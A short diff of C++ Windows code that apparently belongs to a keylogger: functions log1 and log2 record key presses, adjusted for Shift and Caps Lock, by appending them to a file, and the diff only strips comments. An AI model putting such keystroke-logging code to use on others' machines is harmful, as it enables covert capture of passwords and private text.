@@ -163,19 +163,19 @@ int log1(int key, const char *filename) {
 	if(out_file.is_open()) {
 	
 		if((!GetAsyncKeyState(VK_SHIFT)) && (IsCapsLockUp == false)) {
-			//lower case
+			
 			key+=32;
 			out_file << char (key);
 		}
 		
 		else if((GetAsyncKeyState(VK_SHIFT)) && (IsCapsLockUp == true)) {
-			// Lower case
+			
 			key+=32;
 			out_file << char (key);
 		}
 		
 		else {
-			// Upper case
+	
 			out_file << char (key);
 		}
 		out_file.close();
@@ -193,7 +193,7 @@ int log2(int key, const char *filename) {
 	std::ofstream out_file(filename, std::ofstream::out | std::ofstream::app);
 
 	if(out_file.is_open()) {
-		// Take 'SHIFT' key into account
+		
 		if(!GetAsyncKeyState(VK_SHIFT)) {
 			switch(key) {
 				
@@ -273,7 +273,7 @@ int log2(int key, const char *filename) {
 		return 0;
 	}
 	else {
-		// Failure
+	
 		return 1;
 	}
 }
